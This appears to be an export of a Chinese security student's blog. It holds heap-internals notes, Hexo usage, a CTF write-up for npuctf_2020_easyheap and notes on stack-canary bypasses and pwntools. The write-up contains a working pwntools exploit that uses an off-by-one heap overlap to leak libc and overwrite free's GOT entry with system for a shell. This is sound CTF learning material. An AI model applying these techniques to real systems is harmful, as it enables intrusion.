<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span>  <span class="hljs-comment">//tcache单链表的链表头</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];      <span class="hljs-comment">//各个链表头构成的指针数组</span><br>&#125; tcache_perthread_struct;<br><br><span class="hljs-type">static</span> __thread <span class="hljs-type">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);          <span class="hljs-comment">//单链表未满7</span><br>  e-&gt;next = tcache-&gt;entries[tc_idx];    <br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);         <span class="hljs-comment">//在范围内</span><br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);      <span class="hljs-comment">//对应大小的单链表不为空</span><br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="pwndbg堆查看指令"><a href="#pwndbg堆查看指令" class="headerlink" title="pwndbg堆查看指令"></a>pwndbg堆查看指令</h2><h5 id="1-查看内存指令x："><a href="#1-查看内存指令x：" class="headerlink" title="1.查看内存指令x："></a>1.查看内存指令x：</h5><p>x &#x2F;nuf 0x123456 &#x2F;&#x2F;常用，x指令的格式是：x空格&#x2F;nfu，nfu代表三个参数</p><p>n代表显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节），放在’&#x2F;‘后面<br>u代表一个单元几个字节，b(一个字节)，h(二个字节)，w(四字节)，g(八字节)<br>f代表显示数据的格式，f和u的顺序可以互换，也可以只有一个或者不带n，用的时候很灵活<br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>s 按字符串显示。<br>b 按字符显示。<br>i 显示汇编指令。<br>x &#x2F;10gx 0x123456 &#x2F;&#x2F;常用，从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</p><p>x &#x2F;10xd $rdi &#x2F;&#x2F;从rdi指向的地址向后打印10个单元，每个单元4字节的十进制数</p><p>x &#x2F;10i 0x123456 &#x2F;&#x2F;常用，从0x123456处向后显示十条汇编指令</p><h5 id="2-堆操作指令（pwndbg插件独有）"><a href="#2-堆操作指令（pwndbg插件独有）" class="headerlink" title="2.堆操作指令（pwndbg插件独有）"></a>2.堆操作指令（pwndbg插件独有）</h5><p>arena &#x2F;&#x2F;显示arena的详细信息<br>arenas &#x2F;&#x2F;显示所有arena的基本信息<br>arenainfo &#x2F;&#x2F;好看的显示所有arena的信息<br>bins &#x2F;&#x2F;常用，查看所有种类的堆块的链表情况<br>fastbins &#x2F;&#x2F;单独查看fastbins的链表情况<br>largebins &#x2F;&#x2F;同上，单独查看largebins的链表情况<br>smallbins &#x2F;&#x2F;同上，单独查看smallbins的链表情况<br>unsortedbin &#x2F;&#x2F;同上，单独查看unsortedbin链表情况<br>tcachebins &#x2F;&#x2F;同上，单独查看tcachebins的链表情况<br>tcache &#x2F;&#x2F;查看tcache详细信息<br>heap &#x2F;&#x2F;数据结构的形式显示所有堆块，会显示一大堆<br>heapbase &#x2F;&#x2F;查看堆起始地址<br>heapinfo、heapinfoall &#x2F;&#x2F;显示堆得信息，和bins的挺像的，没bins好用<br><strong>parseheap &#x2F;&#x2F;显示堆结构，很好用（不包括堆区域外通过uaf申请的内存）</strong><br>tracemalloc &#x2F;&#x2F;好用，会跟提示所有操作堆的地方</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客维护</title>
    <link href="/2023/05/18/%E5%8D%9A%E5%AE%A2%E7%BB%B4%E6%8A%A4/"/>
    <url>/2023/05/18/%E5%8D%9A%E5%AE%A2%E7%BB%B4%E6%8A%A4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hexo.fluid-dev.com/docs/">Hexo Fluid 用户手册</a></p><p>当前主题的配置文件：_config.fluid.yml</p><h2 id="hexo-s"><a href="#hexo-s" class="headerlink" title="hexo s"></a><strong>hexo s</strong></h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">hexo</span> s<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>启动本地服务器，用于预览主题。默认地址： <a href="http://localhost:4000/">http://localhost:4000/</a></p><ul><li>hexo s 是 hexo server 的缩写，命令效果一致；</li><li>预览的同时可以修改文章内容或主题代码，保存后刷新页面即可；</li><li>对 Hexo 根目录 _config.yml 的修改，需要重启本地服务器后才能预览效果。</li></ul><h2 id="hexo-new"><a href="#hexo-new" class="headerlink" title="hexo new"></a><strong>hexo new</strong></h2><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;学习笔记  六&quot;</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>新建一篇标题为 学习笔记 六 的文章，因为标题里有空格，所以加上了引号。</p><ul><li>文章标题可以在对应 md 文件里改，新建时标题可以写的简单些。</li></ul><h2 id="hexo-d"><a href="#hexo-d" class="headerlink" title="hexo d"></a><strong>hexo d</strong></h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">hexo</span> d<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>自动生成网站静态文件，并部署到设定的仓库。</p><ul><li>hexo d 是 hexo deploy 的缩写，命令效果一致。</li></ul><h2 id="hexo-clean"><a href="#hexo-clean" class="headerlink" title="hexo clean"></a><strong>hexo clean</strong></h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">hexo <span class="hljs-built_in">clean</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>清除缓存文件 db.json 和已生成的静态文件 public 。</p><ul><li>网站显示异常时可以执行这条命令试试。</li></ul><h2 id="hexo-g"><a href="#hexo-g" class="headerlink" title="hexo g"></a><strong>hexo g</strong></h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">hexo</span> g<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>生成网站静态文件到默认设置的 public 文件夹。</p><ul><li>便于查看网站生成的静态文件或者手动部署网站；</li><li>如果使用自动部署，不需要先执行该命令；</li><li>hexo g 是 hexo generate 的缩写，命令效果一致。</li></ul><h2 id="hexo-new-page"><a href="#hexo-new-page" class="headerlink" title="hexo new page"></a><strong>hexo new page</strong></h2><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> aboutme<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>新建一个标题为 aboutme 的页面，默认链接地址为 主页地址&#x2F;aboutme&#x2F;</p><ul><li>标题可以为中文，但一般习惯用英文；</li><li>页面标题和文章一样可以随意修改；</li><li>页面不会出现在首页文章列表和归档中，也不支持设置分类和标签。</li></ul><h2 id="内置图标库以及自定义图标"><a href="#内置图标库以及自定义图标" class="headerlink" title="内置图标库以及自定义图标"></a><a href="https://hexo.fluid-dev.com/docs/icon/#%E5%86%85%E7%BD%AE%E7%A4%BE%E4%BA%A4%E5%9B%BE%E6%A0%87">内置图标库以及自定义图标</a></h2><h3 id="文章的tags和categories"><a href="#文章的tags和categories" class="headerlink" title="文章的tags和categories"></a>文章的tags和categories</h3><p>以下面为例，tags的各个标签是平行的，catagories从上往下是包含的，这里会有一个‘linux’文件夹，‘linux’文件夹里又有basic文件夹</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs subunit">title: linux_shell命令<br>date: 2022<span class="hljs-string">-09</span><span class="hljs-string">-08</span> 00:12:41<br><span class="hljs-keyword">tags:</span><br>- linux<br>- shell<br>categories:<br>- linux<br>- basic<br></code></pre></td></tr></table></figure><p>catagories目录结构（持续完善）</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">buu </span>  <br>-pwn<br>-re<br>-crypto<br>-web<br>-misc<br>复现以及实战<br>-cve复现<br>-比赛复现            <br>-xxctf<br>-xxctf<br>-恶意代码分析实战<br>渗透测试<br><span class="hljs-keyword">basic</span><br><span class="hljs-keyword"></span>其它<br>pwn<br>-general<br>-ROP<br>-<span class="hljs-keyword">shellcode</span><br><span class="hljs-keyword"></span>-heap<br>-fmt<br>-kernel<br>-arm_pwn<br>reverse<br>iot<br>密码学<br></code></pre></td></tr></table></figure><p>tags标记更加细分的知识点</p>]]></content>
    
    
    <categories>
      
      <category>其它</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>npuctf_2020_easyheap</title>
    <link href="/2023/05/18/npuctf-2020-easyheap/"/>
    <url>/2023/05/18/npuctf-2020-easyheap/</url>
    
    <content type="html"><![CDATA[<h1 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a>npuctf_2020_easyheap</h1><p>考点：off_by_one</p><p>got表可写，没开pie，ubuntu版本1804，glibc2.27</p><p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518153935.png" alt="QQ截图20230518153935"></p><p>经典菜单题</p><p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518154423.png" alt="QQ截图20230518154423"></p><p>create函数，</p><p>1.存在bss段的内存来存放chunk的管理结构的指针，chunk的管理结构通过malloc(0x10)申请，分别存放用户申请的chunk的size和指针</p><p>2.限制了用户只能申请0x18和0x38的size，即用户申请的chunk算上chunk_header只能是0x20或0x40</p><p>3.最多申请10个chunk</p><p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518164014.png" alt="QQ截图20230518164014"></p><p>edit()</p><p>存在off_by_one漏洞</p><p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518165404.png" alt="QQ截图20230518165404"></p><p>show()</p><p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518165551.png" alt="QQ截图20230518165551"></p><p>delete()删除堆，不存在uaf，没问题</p><p>思路：got表可写，首先考虑修改free_got(其实atoi函数也可以)来getshell，只要能把管理员chunk中存放的指针修改成free_got，便能通过edit和show函数进行修改和泄露</p><p>由于edit能修改的个数取决于管理员chunk中存放的size，所以通过off_by_one修改下一个chunk的size位来溢出是不可行的。</p><p>经过尝试，发现可以利用fastbin，修改0x20的chunk为0x40，把被修改的chunk删了放到fastbin，再申请0x38的chunk，这时候0x20的管理员chunk被申请到了高地址的0x20，0x40的chunk被申请到了低地址的0x20，也就是说0x20的管理员chunk被包含在了0x40的用户chunk中</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,binary=<span class="hljs-string">&#x27;./npuctf_2020_easyheap&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./npuctf_2020_easyheap&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./npuctf_2020_easyheap&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>sleep(<span class="hljs-number">1</span>)<br>gdb.attach(io,<span class="hljs-string">&#x27;b menu&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))   <br>io.recvuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>io.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>io.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>) <span class="hljs-comment">#2</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>))<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x38</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1  **chunk_overlap</span><br><span class="hljs-comment">#debug()</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x200</span>)+p64(free_got))<br>show(<span class="hljs-number">1</span>)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Content : &#x27;</span>)<br>free_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] free_addr = &#x27;</span> + <span class="hljs-built_in">hex</span>(free_addr))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_addr)<br>libc_base = free_addr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">1</span>,p64(system_addr))<br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#3</span><br>delete(<span class="hljs-number">3</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>buu</category>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fastbin_attack</tag>
      
      <tag>heap</tag>
      
      <tag>glibc2.27</tag>
      
      <tag>off_by_one</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>canary保护及绕过学习</title>
    <link href="/2022/09/22/canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/09/22/canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h5 id="星盟-pwn-学习记录"><a href="#星盟-pwn-学习记录" class="headerlink" title="星盟 pwn 学习记录"></a>星盟 pwn 学习记录</h5><h1 id="什么是canary保护"><a href="#什么是canary保护" class="headerlink" title="什么是canary保护"></a>什么是canary保护</h1><p>canary保护又称金丝雀保护，作用是为了防止栈溢出的一种保护机制。工作原理是从fs&#x2F;gs寄存器取值放在rbp-4或者rbp-8的位置（32位&#x2F;64位），当用户输入结束后，程序会从rbp-4或者rbp-8的位置取出并与fs&#x2F;gs寄存器对应位置的值进行比较（这个地址指向了一个我们无法看到的随机值，并且fs&#x2F;gs是由内核维护的结构），如果不相等就会执行__ stack_chk_fail函数，这个函数会丢出错误退出进程，从而阻止栈溢出攻击。</p><p>64位程序中，从fs寄存器偏移为0x28的位置取出8字节放入rax寄存器中，再将rax的内容存入rbp-8的位置</p><p>32位程序中，从gs寄存器偏移为0x14的位置取出4字节放入eax寄存器中，再将eax存入ebp-0xc的位置</p><p>canary标志是被mov到存储原bp的地址的下面，所以不会影响sp的字节对齐</p><p><img src="/2022/09/22/canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><p>32位下的示例</p><p>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> str[<span class="hljs-number">0x10</span>];<br>read(<span class="hljs-number">0</span>,str,<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;eur1ka %s.&quot;</span>,str);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -no-pie -fstack-protector-all -m32 -o canary32 canary.c<br></code></pre></td></tr></table></figure><p>gdb调试</p><p><img src="/2022/09/22/canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/32%E4%BD%8D%E6%B1%87%E7%BC%96.png" alt="32位汇编"></p><p><img src="/2022/09/22/canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/32%E4%BD%8D.png" alt="32位"></p><p>64位程序实例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -no-pie -fstack-protector-all -m64 -o canary64 canary.c<br></code></pre></td></tr></table></figure><p>源码同上方</p><p><img src="/2022/09/22/canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/64%E4%BD%8D%E6%B1%87%E7%BC%96.png" alt="64位汇编"></p><p><img src="/2022/09/22/canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/64%E4%BD%8D.png" alt="64位"></p><h1 id="如何绕过："><a href="#如何绕过：" class="headerlink" title="如何绕过："></a>如何绕过：</h1><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p>canary在栈上存储的最低地址中是&#x2F;x00，即&#x2F;0，防止printf泄露canary，只要把该位覆盖就能格式化输出canary，通过类似printf(“%s”,str)的形式获取canary后再构造栈溢出的payload，格式为溢出字符+canary+ebp溢出字符+要返回到的地址</p><h3 id="canary爆破（针对有fork函数的程序）"><a href="#canary爆破（针对有fork函数的程序）" class="headerlink" title="canary爆破（针对有fork函数的程序）"></a>canary爆破（针对有fork函数的程序）</h3><p>fork()作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序崩溃了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。</p><h3 id="Stack-smashing（故意触发canary-ssp-leak）"><a href="#Stack-smashing（故意触发canary-ssp-leak）" class="headerlink" title="Stack smashing（故意触发canary_ssp leak）"></a>Stack smashing（故意触发canary_ssp leak）</h3><h3 id="劫持-stack-chk-fail"><a href="#劫持-stack-chk-fail" class="headerlink" title="劫持__stack_chk_fail"></a>劫持__stack_chk_fail</h3><p>修改got表中__stack_chk_fail函数的地址，在栈溢出后执行该函数由于该函数的地址被修改，所以程序会跳转到我们想要执行的地址</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>general</category>
      
    </categories>
    
    
    <tags>
      
      <tag>canary</tag>
      
      <tag>basic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwntools基本使用</title>
    <link href="/2022/09/22/pwntools%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/22/pwntools%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="一、实验名称"><a href="#一、实验名称" class="headerlink" title="一、实验名称"></a>一、实验名称</h3><p>pwntools的基本用法</p><h3 id="二、实验目的和要求"><a href="#二、实验目的和要求" class="headerlink" title="二、实验目的和要求"></a>二、实验目的和要求</h3><p>1.掌握pwntools的基本使用方法<br>2.掌握如何编写exploit</p><h3 id="三、实验内容"><a href="#三、实验内容" class="headerlink" title="三、实验内容"></a>三、实验内容</h3><p>1.Process<br>2.Attach<br>3.Shellcraft</p><h3 id="四、实验环境（软、硬件环境，主要仪器设备）"><a href="#四、实验环境（软、硬件环境，主要仪器设备）" class="headerlink" title="四、实验环境（软、硬件环境，主要仪器设备）"></a>四、实验环境（软、硬件环境，主要仪器设备）</h3><p>Linux操作系统，pwntools</p><h3 id="五、实验数据记录"><a href="#五、实验数据记录" class="headerlink" title="五、实验数据记录"></a>五、实验数据记录</h3><h4 id="1-交互"><a href="#1-交互" class="headerlink" title="1.交互"></a>1.交互</h4><p>本地：sh&#x3D;process(“.&#x2F;2.dms”)<br>远程：sh&#x3D;remote(“127.0.0.1”,10001)<br>（1）127.0.0.1表示本地测验，实际题目容器会给定IP地址和端口，连接即可。<br>（2）只要使用了process，最后一定要加上interactive才能完成交互过程。<br>（3）关闭远程连接使用sh.close()</p><h4 id="2-I-x2F-O模块"><a href="#2-I-x2F-O模块" class="headerlink" title="2.I&#x2F;O模块"></a>2.I&#x2F;O模块</h4><p>(1)发送模块<br>A.sendline表示发送一行数据，相当于在数据后面加\n<br>B.sh.send（data）进行数据发送，不一定是一行数据<br>(2)接收模块<br>A.recv语句–numb表示接收的字节，timeout指定超时时间限制<br>parameter&#x3D;”&#x2F;bin&#x2F;sh” p.sendline(parameter)<br>B.recvuntil表示接收数据直到设置的标志出现，此处即直到“here:”出现<br>p.recvuntil(“here:”)<br>搭配使用如下：</p><h4 id="3-Shellcode生成器"><a href="#3-Shellcode生成器" class="headerlink" title="3.Shellcode生成器"></a>3.Shellcode生成器</h4><p>结合asm-汇编与反汇编模块可以自动生成shellcode，得到最终的payload<br>（1）asm()函数接收一个字符串作为参数，可以得到汇编码的机器代码如：</p><p>disasm与其相反如：disaasm(’’)<br>（2）shellcraft模块包含一些生成shellcode的函数，A.shellcraft.arm 是ARM架构的，<br>B.shellcraft.amd64是AMD64架构，<br>C.shellcraft.i386是Intel 80386架构的，<br>D.shellcraft.common是所有架构通用的。<br>此处：shellcraft.sh()是执行&#x2F;bin&#x2F;sh的shellcode。它的位置如下：</p><h4 id="4-elf文件操作"><a href="#4-elf文件操作" class="headerlink" title="4.elf文件操作"></a>4.elf文件操作</h4><p>context是pwntools用来设置环境的功能，由于二进制文件的情况不同，需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。<br>一般来说我们设置context只需要简单的一句话:<br>context(os&#x3D;‘linux’, arch&#x3D;‘amd64’, log_level&#x3D;‘debug’)<br>这句话的意思是：<br>a. os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux<br>b. arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’<br>c. 